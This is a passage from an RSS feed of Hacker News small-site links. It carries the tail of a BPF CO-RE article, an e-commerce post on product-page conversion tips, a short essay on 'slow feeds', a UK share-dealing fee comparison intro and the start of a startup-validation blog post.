<li><p>compiler (Clang) provides means for BPF program C code to express the intent and record relocation information;</p></li>
<li><p>BPF loader (<a href="https://github.com/libbpf/libbpf">libbpf</a>) ties BTFs from kernel and BPF program together to adjust compiled BPF code to specific kernel on target hosts;</p></li>
<li><p>kernel, while staying completely BPF CO-RE-agnostic, provides advanced BPF features to enable some of the more advanced scenarios.</p></li>
</ul>
<p>Working in ensemble, these components …</p></span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html">https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html</a></em></p>]]>
            </description>
            <link>https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259499</guid>
            <pubDate>Mon, 24 Aug 2020 11:10:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Product page • 10 best practices to improve your conversion rate]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24259454">thread link</a>) | @constantinBlger
<br/>
August 24, 2020 | https://constantin-boulanger.fr/en/product-page-10-best-practices-to-improve-your-conversion-rate/ | <a href="https://web.archive.org/web/*/https://constantin-boulanger.fr/en/product-page-10-best-practices-to-improve-your-conversion-rate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Here is a very engaging title! In this article, I offer you 10 simple tips to put in place on your product pages in order to <strong>improve your conversion rate</strong><em>, also called conversion rate!</em> These 10 tips, even if nothing is magic, are based on facts, they have been proven and they are above all feasible and applicable for the majority of e-merchants!</p><h2><span id="Tips_to_improve_your_conversion_rate!"></span>Tips to improve your conversion rate!<span></span></h2><h3><span id="Do_not_disrupt_your_customers%E2%80%99_habits"></span>Do not disrupt your customers’ habits<span></span></h3><p>I know that every e-merchant would like to have a unique store, which breaks the codes. I see it every day. Only take into account the habits of your users and respect the main codes of e-commerce. Indeed, users are used to having the product photo and gallery on the left, and price details, promotions, quantity selector and the “Add to cart” button on the right.</p><p>Habits are the hardest thing to change, and if you disrupt your customers’ habits, you risk scaring them away. Moreover, during a redesign of an e-commerce site, we often see a drop in the <strong>conversion rate</strong> in the short term. Indeed, even if you have improved the overall user experience of your site, your customers have to get used to it again, before your <strong>conversion rate</strong> eventually goes up.</p><p>I advise you to read this article by <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="http://www.capitaine-commerce.com/2009/06/13/23419-cest-dur-de-changer-dhabitudes/" target="_blank" rel="noreferrer noopener nofollow">Capitaine Commerce</a> wich tackles the subject a little more in depth.</p><h3><span id="Your_add_to_cart_button_must_be_clearly_identifiable"></span>Your add to cart button must be clearly identifiable<span></span></h3><p>On the product page, the one and only action you want your customer to do is click the add to cart button. This is why it must be clearly identifiable and easily accessible.</p><p>Too often I see e-commerce sites where the add to cart button is the same color as the contact button, this is to be absolutely avoided and the best way to direct your potential customer to an action that is not not that expected.</p><p>Ideally, your add to cart button should be your site’s primary color. The customer will identify this color as a sign of an important action.</p><p>Also, don’t bury your add to cart button in the middle of other buttons. Do not hesitate to space it out, use and abuse white space. <strong>Your “Add to cart” button will be even more visible.</strong></p><figure><img loading="lazy" width="1024" height="452" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc.jpg?resize=1024%2C452&amp;ssl=1" alt="Add to cart button on Ikea.fr" srcset="https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=1024%2C452&amp;ssl=1 1024w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=300%2C132&amp;ssl=1 300w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=768%2C339&amp;ssl=1 768w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=1536%2C677&amp;ssl=1 1536w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=2048%2C903&amp;ssl=1 2048w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?w=2400&amp;ssl=1 2400w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=1024%2C452&amp;ssl=1 1024w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=300%2C132&amp;ssl=1 300w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=768%2C339&amp;ssl=1 768w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=1536%2C677&amp;ssl=1 1536w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?resize=2048%2C903&amp;ssl=1 2048w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc-scaled.jpg?w=2400&amp;ssl=1 2400w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/ajouter_au_panier_espace_blanc.jpg?resize=1024%2C452&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>“Add to cart” button on Ikea.fr</figcaption></figure><p>Here is an example of a product page on Ikea.fr. As you can see, the “Add to Cart” button is the most prominent item and therefore almost the first item the human eye notices.</p><h3><span id="View_delivery_information"></span>View delivery information<span></span></h3><p>One of the biggest obstacles to buying is delivery. Sometimes it is too expensive, the price is not clearly indicated and above all the customer is not clearly informed about the delivery times.</p><p>This is why I advise you to clearly indicate your delivery times, your prices and if you have the possibility, to display an estimate of the date of reception.</p><p>Your customers will be able to p<em>lan “after pur</em>chase” and perhaps choose the delivery method that suits them best.</p><figure><img loading="lazy" width="1024" height="397" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=1024%2C397&amp;ssl=1" alt="Announcement of delivery date on Amazon.fr " srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=1024%2C397&amp;ssl=1 1024w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=300%2C116&amp;ssl=1 300w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=768%2C298&amp;ssl=1 768w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=1536%2C595&amp;ssl=1 1536w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?w=1956&amp;ssl=1 1956w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=1024%2C397&amp;ssl=1 1024w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=300%2C116&amp;ssl=1 300w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=768%2C298&amp;ssl=1 768w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=1536%2C595&amp;ssl=1 1536w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?w=1956&amp;ssl=1 1956w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/info_livraison_.jpg?resize=1024%2C397&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Delivery date announced on Amazon.fr</em></figcaption></figure><p>Here is a telling example on the Amazon.fr site. For th<a href="https://constantin-blog.eu/2020/07/29/avis-manga-angolmois-1/" target="_blank" rel="noreferrer noopener">e Angolmois m</a>a<em>nga (which I recommend by the</em> <em>w</em>ay 😉), the delivery date is displayed and<strong> is f</strong>o<strong>r tomorrow if I order within 2 hours and 54 minutes!</strong></p><h3><span id="Add_cross_selling_/_upselling"></span>Add cross selling / upselling<span></span></h3><p>On the product page it is important for your user to have access to other products, whether they are products of the same category of the current product (cross selling) or accessory products (upselling) because this allows your potential customer to potentially find the product that suits him best if the current product does not suit him. This is particularly useful for products that offer a move upmarket.</p><p>For you, an e-merchant, it is also a very good way to increase the average <em>basket (AOV – Average Order Value)</em>. Indeed, if you are selling a product, it is always practical to offer the accessories that go with it to your customer. It is a technique that works well, as well in physical as in e-commerce.</p><figure><img loading="lazy" width="978" height="1024" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=978%2C1024&amp;ssl=1" alt="Choice of accessories and options at Tediber" srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=978%2C1024&amp;ssl=1 978w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=287%2C300&amp;ssl=1 287w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=768%2C804&amp;ssl=1 768w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?w=1204&amp;ssl=1 1204w" sizes="(max-width: 978px) 100vw, 978px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=978%2C1024&amp;ssl=1 978w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=287%2C300&amp;ssl=1 287w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=768%2C804&amp;ssl=1 768w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?w=1204&amp;ssl=1 1204w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/accessoires.png?resize=978%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Accessories offered with the Tediber mattress</figcaption></figure><p>In the image below, you can see the accessories / services offered when purchasing a mattress on the Tediber online store.</p><h3><span id="Integrate_customer_reviews"></span>Integrate customer reviews<span></span></h3><p>It sounds pretty basic, but in the end it’s one of the first things you can do to try and <strong>improve your conversion rate</strong> on the product page.</p><p>Indeed, the opinions of other users strongly influence the decision to buy or not. It is not for nothing that there are dozens of restaurant, bar, etc. rating applications, it is the same principle with e-commerce.</p><p>Be careful, however, not to cheat on the opinions and take a reliable and certified opinion collection provider. Personally, I often work with Trusted Shops and Verified Reviews.</p><h3><span id="Have_a_mobile_friendly_product_page"></span>Have a mobile friendly product page <span></span></h3><p>Even if it’s starting to get into the habits of e-merchants, some still don’t care and bite their fingers afterwards. The use of mobile to order is becoming more democratic and I would even go so far as to say that it is intensifying.</p><p>On the product page, display your photos in a gallery where your potential client can slide between the images as they would in their favorite dating app 😏</p><p>It’s unparalleled practicality and efficiency on mobile when the product page, the entire site itself, is responsive.</p><p>Indeed, some browsers, Chrome in the first place, allow you to fill in your credit card information on the payment page and bypass one of the toughest obstacles in e-commerce, having your credit card next to you when ordering. .</p><figure><ul><li><figure><img loading="lazy" width="348" height="1024" src="https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?resize=348%2C1024&amp;ssl=1" alt="Responsive product page of the Respire brand, part 1" data-id="1761" data-full-url="https://constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png" data-link="https://constantin-boulanger.fr/?attachment_id=1761" srcset="https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?w=374&amp;ssl=1 374w" sizes="(max-width: 348px) 100vw, 348px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?w=374&amp;ssl=1 374w" data-lazy-src="https://i1.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-1-col-1.png?resize=348%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img loading="lazy" width="348" height="1024" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?resize=348%2C1024&amp;ssl=1" alt="Responsive product page of the Respire brand, part 2" data-id="1760" data-full-url="https://constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png" data-link="https://constantin-boulanger.fr/?attachment_id=1760" srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?w=374&amp;ssl=1 374w" sizes="(max-width: 348px) 100vw, 348px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?w=374&amp;ssl=1 374w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-2-col-1.png?resize=348%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img loading="lazy" width="348" height="1024" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?resize=348%2C1024&amp;ssl=1" alt="Responsive product page of the Respire brand, part 3" data-id="1759" data-full-url="https://constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png" data-link="https://constantin-boulanger.fr/?attachment_id=1759" srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?w=374&amp;ssl=1 374w" sizes="(max-width: 348px) 100vw, 348px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?w=374&amp;ssl=1 374w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-3-col-1.png?resize=348%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img loading="lazy" width="348" height="1024" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?resize=348%2C1024&amp;ssl=1" alt="Responsive product page of the Respire brand, part 4" data-id="1758" data-full-url="https://constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png" data-link="https://constantin-boulanger.fr/?attachment_id=1758" srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?w=374&amp;ssl=1 374w" sizes="(max-width: 348px) 100vw, 348px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?resize=348%2C1024&amp;ssl=1 348w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?resize=102%2C300&amp;ssl=1 102w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?w=374&amp;ssl=1 374w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/row-4-col-1.png?resize=348%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul><figcaption>Screenshot of a fully responsive Respire brand product page!</figcaption></figure><h3><span id="Offer_a_size_guide_or_a_compatibility_guide"></span>Offer a size guide or a compatibility guide<span></span></h3><p>If you sell shoes, clothes or ink cartridges compatible with a particular printer, display a guide!</p><p>Some people, me the first, do not dare to buy their clothes too much on the internet mainly because they do not know how to size the clothes or the shoe. Size 43 at New-Balance is not necessarily the same as it is Adidas, Nike etc.</p><p>Ditto for household appliances or computer accessories, display the references with which these products are compatible! I used the example of a toner cartridge because it is my concern at the moment to find a printer but it can work with appliances, kitchen accessories, etc.</p><h3>Show images related to the options offered<span></span></h3><p>Similar to the tip above, your customers love to see what they’re buying!</p><p>Therefore, if you offer different colors for a product, do not hesitate to add photos representing the product in those colors in the product image gallery. This is also valid for options of materials, textures or other.</p><p>This will allow your customer to see the product they are going to receive and not be surprised when they open the box.</p><p>In the same spirit, in-situ photos are always more attractive and meaningful because they allow the buyer to project even further!</p><h3><span id="You_need_a_title_and_a_clear_description"></span>You need a title and a clear description<span></span></h3><p>Once again, this is only common sense, but if I recall it, it is unfortunately necessary. A lot of times I see product descriptions full of nonsense and clearly not binding on the purchase. Highlight all the strengths of your products. It doesn’t matter the design, origin, durability, but write clear, precise and true descriptions.</p><p>For product titles, avoid lengthy titles. When it is too long it means that there are unnecessary details and potentially disturbing to the buyer.</p><h3><span id="Show_reinsurance"></span>Show reinsurance<span></span></h3><p>Always in the idea of reducing the number of brakes on the purchase, use reinsurance what is it? They are usually big icons indicating that shipping is free, returns are free, and that you are satisfied or your money back.</p><figure><img loading="lazy" src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?resize=819%2C354&amp;ssl=1" alt="Reinsurance image on Nature &amp; Découvertes" width="819" height="354" srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?w=956&amp;ssl=1 956w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?resize=300%2C130&amp;ssl=1 300w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?resize=768%2C333&amp;ssl=1 768w" sizes="(max-width: 819px) 100vw, 819px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?w=956&amp;ssl=1 956w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?resize=300%2C130&amp;ssl=1 300w, https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?resize=768%2C333&amp;ssl=1 768w" data-lazy-src="https://i0.wp.com/constantin-boulanger.fr/wp-content/uploads/2020/08/reassurance.png?resize=819%2C354&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Reinsurance of Nature and Discoveries</figcaption></figure><p>Personally, if a site does not give me such reassurance, I move on to the next. Customers are used to these little inserts and have questions if they are not present.</p><h2><span id="Conclusion"></span>Conclusion<span></span></h2><p>So here is a list of tips to <strong>increase your conversion rate</strong>, focused on the product page.</p><p>As mentioned at the beginning of the article, nothing is magic and the result of these actions will be felt in the long term. These tips are based on observations from hundreds of stores and have proven their worth in the world of e-commerce.</p><p>Remember that to increase your <strong>conversion rate</strong>, you need to remove as many buying brakes as possible and imaginable. Your future client should not ask any questions!</p><p>This first article will open the way for one or two more articles on <strong>improving conversion rates</strong>. The next one will be either focused on the purchase tunnel or the category page, pages often damaged by e-merchants!</p><p>Also, what works quite well with some of my clients is a <a href="https://constantin-boulanger.fr/utiliser-le-parrainage-client-pour-developper-votre-boutique-en-ligne/">referral program</a>. This makes it easy for your customers to invite their loved ones for compensation and to acquire new potential customers easily!</p><p>Do not hesitate if you have questions, comments or simply, if you want to discuss!</p></div></div>]]>
            </description>
            <link>https://constantin-boulanger.fr/en/product-page-10-best-practices-to-improve-your-conversion-rate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259454</guid>
            <pubDate>Mon, 24 Aug 2020 11:02:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Rise of Slow Feeds]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24259442">thread link</a>) | @linuz90
<br/>
August 24, 2020 | https://fabriziorinaldi.com/blog/slow-feeds | <a href="https://web.archive.org/web/*/https://fabriziorinaldi.com/blog/slow-feeds">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In a few years, they're going to be everywhere: slow feeds, one-off digests, highly filtered content from your favorite sources.</p>
<p>Fewer algorithms, less recommended content, more good stuff from people you actually care about.</p>
<p>We're already seeing it with <a href="https://substack.com/">Substack</a>. How cumbersome is it to subscribe to a different newsletter from each writer you want to follow? Still, people would rather do this than get lost in yet another platform where the signal gets lost in a sea of noise.</p>
<p>The transition is also <strong>from synchronicity to asynchronicity.</strong> Staying home locked down for months helped us realize that we could easily spend 8 full hours per day scrolling feeds, and yet no end would ever be in sight.</p>
<p>Why? Because that's how feeds are built: they're intrinsically <strong>synchronous, addictive, and endless</strong>.</p>
<p>The solution? <strong>Slower feeds.</strong> Better feeds. Purposeful and controlled digests, versus endless and mindless flows of information. A few companies are attempting to build them — <a href="https://mailbrew.com/">mine</a> among them — and I bet they're going to be everywhere soon.</p>
<p>While many tech companies will still try to get AIs to guess what's the next article you want to read, others will hopefully give back control in our hands, and try to unlearn what years of obsession for algorithms taught us. That's how we ended up here anywhere.</p>
<p>There must be a reason we miss Google Reader.</p></div></div>]]>
            </description>
            <link>https://fabriziorinaldi.com/blog/slow-feeds</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259442</guid>
            <pubDate>Mon, 24 Aug 2020 11:01:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Cheapest Share Dealing Platforms in the UK]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24259295">thread link</a>) | @Halimah
<br/>
August 24, 2020 | https://www.koody.co/investing/compare-shares-isa-charges | <a href="https://web.archive.org/web/*/https://www.koody.co/investing/compare-shares-isa-charges">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Typically, your annual charge depends on whether you hold funds or shares in your investment ISA. Here, we assume you'll invest in shares only. If you plan to invest in funds, have a look at our <a href="https://www.koody.co/investing/compare-funds-isa-charges">funds' comparison charts</a>. When you invest in shares, you'll have to pay several charges. In our pricing table below, we've only considered platform and dealing fees. You can find out more about online share dealing and its associated costs in our <a href="https://www.koody.co/investing/shares">Investing in Shares guide</a>.<br>‍<br><span><strong>Important:</strong></span><strong><br></strong>The table below shows annual charges of several share dealing platforms when you invest lump sums of £5,000, £20,000 or £100,000 in one year and make 12 ad hoc deals in the same year. A deal is either one of buying or selling an investment. It is also called a trade. We've used the colour red to indicate what platforms are more expensive compared to the others. This means the darker the shade of red, the more expensive the platform. Dark red doesn't mean bad or too expensive; it just means the platform is more expensive than others. If you would like to see a breakdown of fees charged by each platform, have a look at our <a href="https://www.koody.co/investing/charges-directory">Platform Charges Directory</a>.</p><p>We haven't included any calculations for regular investing, but we do note in the second column, regular investing dealing fees for your information.</p><p>Finally, it is important to let you know we show the costs which apply to the first year only. This is especially important because, with platforms such as iWeb, your charges reduce after the first year. Whereas, with platforms such as EQi, your charges might increase after the first year. You'll find all the details you need below. For each provider we list, your money is protected by the Financial Services Compensation Scheme (FSCS). This means you could get your money back up to £85,000 if any of the companies goes bust.</p></div></div>]]>
            </description>
            <link>https://www.koody.co/investing/compare-shares-isa-charges</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259295</guid>
            <pubDate>Mon, 24 Aug 2020 10:37:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My startup validation process]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 54 (<a href="https://news.ycombinator.com/item?id=24259246">thread link</a>) | @NeilRamp
<br/>
August 24, 2020 | https://neilcocker.com/2020/08/22/my-startup-validation-process/ | <a href="https://web.archive.org/web/*/https://neilcocker.com/2020/08/22/my-startup-validation-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

		<!-- #masthead -->

			<!-- .image-header -->
	
	

<section id="content">
	<div>
		<div>
						<div id="primary">
							<main id="main" role="main">

					
						
<article id="post-2340">
	<!-- .entry-header -->

	<div>
		
<p>I’m very interested in how startups validate their ideas. I’m finding that actually a staggering amount of them barely do. Or just do it very badly.</p>



<p>There’s no one right way to validate a startup idea. And, even if you do it perfectly, it doesn’t guarantee success. But it does hugely reduce the risk of failure.</p>



<p>What I outline below is the method I’ve been using for a while. It’s <strong>not comprehensive</strong>, and each of the steps can be done in a much more detailed way. But it’s <strong>quick</strong>, captures good data, and gives you a very strong footing to start your journey.</p>



<p>TL;DR</p>



<ul><li>Define your customer – 1 hour</li><li>Read a book – 3 hours</li><li>Write your hypothesis – 1 hour</li><li>Create and distribute a survey – 4 hours</li><li>Speak to people (properly!) – 10+ hours</li></ul>



<figure><img data-attachment-id="2355" data-permalink="https://neilcocker.com/william-iven-gcsnospexfs-unsplash/" data-orig-file="https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg" data-orig-size="4193,2785" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="william-iven-gcsnospexfs-unsplash" data-image-description="" data-medium-file="https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=300" data-large-file="https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=750" src="https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=1024" alt="" srcset="https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=1024 1024w, https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=2048 2048w, https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=150 150w, https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=300 300w, https://neilcocker.files.wordpress.com/2020/08/william-iven-gcsnospexfs-unsplash.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Photo by <a href="https://unsplash.com/@firmbee?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">William Iven</a> on <a href="https://unsplash.com/s/photos/research?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure>



<p>Here’s a quick breakdown of each one of these. </p>



